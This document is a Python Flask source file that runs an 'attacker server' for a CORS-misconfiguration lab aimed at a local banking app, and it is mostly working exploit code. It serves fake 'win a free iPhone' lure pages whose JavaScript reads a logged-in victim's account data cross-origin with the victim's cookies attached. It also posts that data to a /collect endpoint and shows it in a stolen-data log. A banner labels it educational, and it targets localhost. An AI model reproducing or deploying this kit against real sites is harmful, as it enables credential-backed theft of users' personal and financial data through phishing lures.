from flask import Flask, request, jsonify, render_template_string, make_response
import json
from datetime import datetime

app = Flask(__name__)

# In-memory log of data exfiltrated from victims
stolen_data_log = []

# Attacker's main malicious page
ATTACKER_MAIN_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>Attacker's Command Center</title>
    <style>
        body {
            font-family: 'Courier New', monospace;
            background: #1a1a1a;
            color: #00ff00;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: #0d0d0d;
            padding: 30px;
            border-radius: 10px;
            border: 2px solid #00ff00;
        }
        h1 {
            color: #ff0000;
            text-shadow: 2px 2px 4px #000;
        }
        .server-info {
            background: #1a3a1a;
            border: 1px solid #00ff00;
            padding: 15px;
            border-radius: 5px;
            margin: 20px 0;
        }
        .exploit-list {
            margin: 30px 0;
        }
        .exploit-link {
            display: block;
            background: #2a2a2a;
            padding: 15px;
            margin: 10px 0;
            border-radius: 5px;
            border-left: 5px solid #ff0000;
            text-decoration: none;
            color: #00ff00;
            transition: all 0.3s;
        }
        .exploit-link:hover {
            background: #3a3a3a;
            border-left: 5px solid #00ff00;
        }
        .warning {
            background: #3a1a1a;
            border: 2px solid #ff0000;
            padding: 15px;
            border-radius: 5px;
            margin: 20px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>☠️ ATTACKER'S COMMAND CENTER ☠️</h1>
        
        <div class="server-info">
            <strong>Attacker Server:</strong> Running on http://localhost:8000<br>
            <strong>Target Server:</strong> http://localhost:5000 (SecureBank)<br>
            This is the EVIL server that will steal user data
        </div>
        
        <div class="warning">
            ⚠️ <strong>EDUCATIONAL PURPOSES ONLY</strong><br>
            This simulates an attacker's malicious website.<br>
            In real attacks, this would be on a different domain (e.g., evil-attacker.com)
        </div>
        
        <div class="exploit-list">
            <h2>Available Exploits:</h2>
            
            <a href="/exploit-simple" class="exploit-link">
                <strong>POC #1: Simple Data Theft</strong><br>
                <small>Steals data and displays it in an alert (proof of concept)</small>
            </a>
            
            <a href="/exploit-advanced" class="exploit-link">
                <strong>POC #2: Advanced Exfiltration</strong><br>
                <small>Steals data and sends it back to attacker's server</small>
            </a>
            
            <a href="/stolen-data" class="exploit-link">
                <strong>View Stolen Data Log</strong><br>
                <small>See all data collected from victims</small>
            </a>
        </div>
        
        <div style="margin-top: 40px; padding: 20px; background: #1a1a3a; border-radius: 5px;">
            <h3>How This Attack Works:</h3>
            <ol style="line-height: 1.8;">
                <li>Victim is logged into SecureBank (localhost:5000)</li>
                <li>Attacker tricks victim into visiting this page (localhost:8000)</li>
                <li>Malicious JavaScript makes cross-origin request to victim's bank</li>
                <li>Because of CORS misconfiguration, browser allows the request</li>
                <li>Victim's session cookie is sent automatically</li>
                <li>Sensitive data is returned and stolen by attacker</li>
                <li>Data is exfiltrated to attacker's server</li>
            </ol>
        </div>
    </div>
</body>
</html>
"""

# Simple exploit POC
ATTACKER_POC_SIMPLE = """
<!DOCTYPE html>
<html>
<head>
    <title>Win a Free iPhone!</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 50px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }
        .container {
            background: white;
            color: #333;
            max-width: 600px;
            margin: 0 auto;
            padding: 40px;
            border-radius: 15px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
        }
        button {
            background: #e74c3c;
            color: white;
            border: none;
            padding: 15px 40px;
            font-size: 20px;
            border-radius: 8px;
            cursor: pointer;
            margin: 20px 0;
        }
        button:hover {
            background: #c0392b;
        }
        #result {
            margin-top: 20px;
            padding: 20px;
            background: #f8f9fa;
            border-radius: 8px;
            text-align: left;
            display: none;
        }
        .emoji {
            font-size: 60px;
        }
        .attacker-info {
            background: #2c3e50;
            color: white;
            padding: 10px;
            border-radius: 5px;
            font-size: 12px;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="attacker-info">
            ☠️ <strong>Attacker's Malicious Page</strong> - http://localhost:8000<br>
            🎯 Target: http://localhost:5000/api/v2/user/
        </div>
        
        <div class="emoji">🎁</div>
        <h1>Congratulations!</h1>
        <h2>You've been selected to win a FREE iPhone 15 Pro!</h2>
        <p>Click the button below to claim your prize!</p>
        <button onclick="claimPrize()">CLAIM MY PRIZE NOW! 🎉</button>
        <div id="result"></div>
    </div>

    <script>
        function claimPrize() {
            console.log('Requesting http://localhost:5000/api/v2/user/ from origin http://localhost:8000');

            var xhr = new XMLHttpRequest();
            xhr.onreadystatechange = function() {
                if (this.readyState == 4 && this.status == 200) {
                    var stolenData = JSON.parse(this.responseText);
                    console.log('Cross-origin read succeeded:', stolenData);

                    // A real attack would exfiltrate this instead of showing it.
                    document.getElementById('result').style.display = 'block';
                    document.getElementById('result').innerHTML = `
                        <h3 style="color: #e74c3c;">CORS VULNERABILITY EXPLOITED!</h3>
                        <p><strong>Cross-Origin Request Succeeded!</strong></p>
                        <p><strong>Attacker Origin:</strong> http://localhost:8000</p>
                        <p><strong>Victim Origin:</strong> http://localhost:5000</p>
                        <hr>
                        <p><strong>Stolen Data:</strong></p>
                        <pre style="background: #2c3e50; color: #fff; padding: 15px; border-radius: 5px; overflow-x: auto;">${JSON.stringify(stolenData, null, 2)}</pre>
                        <p style="color: #e74c3c; font-weight: bold;">
                            In a real attack, this data would be sent to the attacker's server!
                        </p>
                    `;
                }
            };

            xhr.open("GET", "http://localhost:5000/api/v2/user/", true);
            xhr.withCredentials = true;  // send the victim's cookies with the request
            xhr.send();
        }
    </script>
</body>
</html>
"""

# Advanced exploit with data exfiltration
ATTACKER_POC_ADVANCED = """
<!DOCTYPE html>
<html>
<head>
    <title>Win a Free iPhone!</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 50px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }
        .container {
            background: white;
            color: #333;
            max-width: 600px;
            margin: 0 auto;
            padding: 40px;
            border-radius: 15px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
        }
        button {
            background: #e74c3c;
            color: white;
            border: none;
            padding: 15px 40px;
            font-size: 20px;
            border-radius: 8px;
            cursor: pointer;
            margin: 20px 0;
        }
        button:hover {
            background: #c0392b;
        }
        .status {
            margin-top: 20px;
            padding: 15px;
            border-radius: 5px;
            display: none;
        }
        .success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        .emoji {
            font-size: 60px;
        }
        .attacker-info {
            background: #2c3e50;
            color: white;
            padding: 10px;
            border-radius: 5px;
            font-size: 12px;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="attacker-info">
            <strong>Attacker's Malicious Page</strong> - http://localhost:8000<br>
            Target: http://localhost:5000/api/v2/user/
        </div>
        
        <div class="emoji">🎁</div>
        <h1>Congratulations!</h1>
        <h2>You've been selected to win a FREE iPhone 15 Pro!</h2>
        <p>Click the button below to claim your prize!</p>
        <button onclick="claimPrize()">CLAIM MY PRIZE NOW! 🎉</button>
        <div id="status" class="status"></div>
    </div>

    <script>
        function claimPrize() {
            // Step 1: read the victim's data via the CORS misconfiguration.
            var xhr = new XMLHttpRequest();
            xhr.onreadystatechange = function() {
                if (this.readyState == 4 && this.status == 200) {
                    console.log('Read victim data, exfiltrating...');
                    exfiltrateData(this.responseText);
                }
            };
            xhr.open("GET", "http://localhost:5000/api/v2/user/", true);
            xhr.withCredentials = true;
            xhr.send();
        }

        function exfiltrateData(data) {
            // Step 2: POST the stolen data back to the attacker's own server.
            var exfilXhr = new XMLHttpRequest();
            exfilXhr.open("POST", "http://localhost:8000/collect", true);
            exfilXhr.setRequestHeader("Content-Type", "application/json");
            exfilXhr.onreadystatechange = function() {
                if (this.readyState == 4) {
                    console.log('Exfiltration complete');
                    document.getElementById('status').style.display = 'block';
                    document.getElementById('status').className = 'status success';
                    document.getElementById('status').innerHTML = `
                        <strong>"Prize Claimed Successfully!"</strong><br>
                        <small style="color: #721c24;">
                            <strong>What really happened:</strong><br>
                            1. Cross-origin request from localhost:8000 → localhost:5000<br>
                            2. CORS misconfiguration allowed the request<br>
                            3. Your sensitive data was stolen<br>
                            4. Data sent to attacker's server (localhost:8000/collect)<br>
                            5. Check the attacker's server logs!
                        </small>
                    `;
                }
            };
            exfilXhr.send(JSON.stringify({
                stolen_data: data,
                victim_origin: "http://localhost:5000",
                attacker_origin: "http://localhost:8000",
                timestamp: new Date().toISOString()
            }));
        }
    </script>
</body>
</html>
"""

# Stolen data viewer
STOLEN_DATA_VIEWER = """
<!DOCTYPE html>
<html>
<head>
    <title>Stolen Data Log</title>
    <style>
        body {
            font-family: 'Courier New', monospace;
            background: #0d0d0d;
            color: #00ff00;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: #1a1a1a;
            padding: 30px;
            border-radius: 10px;
            border: 2px solid #ff0000;
        }
        h1 {
            color: #ff0000;
        }
        .data-entry {
            background: #0d0d0d;
            border: 1px solid #00ff00;
            padding: 15px;
            margin: 15px 0;
            border-radius: 5px;
        }
        .timestamp {
            color: #ffff00;
            font-weight: bold;
        }
        pre {
            background: #000;
            padding: 15px;
            border-radius: 5px;
            overflow-x: auto;
        }
        .empty {
            text-align: center;
            padding: 40px;
            color: #888;
        }
        button {
            background: #ff0000;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            margin: 10px 0;
        }
        button:hover {
            background: #cc0000;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>📊 STOLEN DATA LOG</h1>
        <button onclick="location.reload()">🔄 Refresh</button>
        <button onclick="window.location.href='/'">← Back to Command Center</button>
        <div id="data-container"></div>
    </div>
    
    <script>
        fetch('/api/stolen-data')
            .then(response => response.json())
            .then(data => {
                const container = document.getElementById('data-container');
                
                if (data.count === 0) {
                    container.innerHTML = '<div class="empty">No data stolen yet. Run an exploit first!</div>';
                    return;
                }
                
                container.innerHTML = `<h2>Total Victims: ${data.count}</h2>`;
                
                data.logs.forEach((entry, index) => {
                    const div = document.createElement('div');
                    div.className = 'data-entry';
                    div.innerHTML = `
                        <h3>Entry #${index + 1}</h3>
                        <p class="timestamp">⏰ ${entry.timestamp}</p>
                        <p>🌐 Victim Origin: ${entry.victim_origin}</p>
                        <p>☠️ Attacker Origin: ${entry.attacker_origin}</p>
                        <pre>${JSON.stringify(JSON.parse(entry.stolen_data), null, 2)}</pre>
                    `;
                    container.appendChild(div);
                });
            });
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    """Attacker's main command center"""
    return render_template_string(ATTACKER_MAIN_PAGE)

@app.route('/exploit-simple')
def exploit_simple():
    """Serve the simple exploit page (POC with alert)"""
    return render_template_string(ATTACKER_POC_SIMPLE)

@app.route('/exploit-advanced')
def exploit_advanced():
    """Serve the advanced exploit page (POC with data exfiltration)"""
    return render_template_string(ATTACKER_POC_ADVANCED)

@app.route('/stolen-data')
def stolen_data_viewer():
    """View stolen data"""
    return render_template_string(STOLEN_DATA_VIEWER)

@app.route('/api/stolen-data')
def api_stolen_data():
    """API to get stolen data"""
    return jsonify({
        'count': len(stolen_data_log),
        'logs': stolen_data_log
    })

@app.route('/collect', methods=['POST', 'OPTIONS'])
def collect_stolen_data():
    """Receive exfiltrated data from the exploit page and log it."""
    if request.method == 'OPTIONS':
        response = make_response('', 204)
    else:
        data = request.get_json()
        stolen_data_log.append(data)

        print(f"[attacker] received exfiltrated data at {data.get('timestamp')}")
        print(f"  victim origin:   {data.get('victim_origin')}")
        print(f"  attacker origin: {data.get('attacker_origin')}")
        print(json.dumps(json.loads(data.get('stolen_data')), indent=2))

        response = make_response(jsonify({"status": "received"}))

    # Allow the exploit page (same origin as this server) to POST here.
    response.headers['Access-Control-Allow-Origin'] = 'http://localhost:8000'
    response.headers['Access-Control-Allow-Methods'] = 'POST, OPTIONS'
    response.headers['Access-Control-Allow-Headers'] = 'Content-Type'

    return response


if __name__ == '__main__':
    print("Attacker server starting on http://localhost:8000")
    print("  command center:   http://localhost:8000/")
    print("  simple exploit:   http://localhost:8000/exploit-simple")
    print("  advanced exploit: http://localhost:8000/exploit-advanced")
    print("  stolen data log:  http://localhost:8000/stolen-data")
    app.run(host='0.0.0.0', port=8000, debug=True)
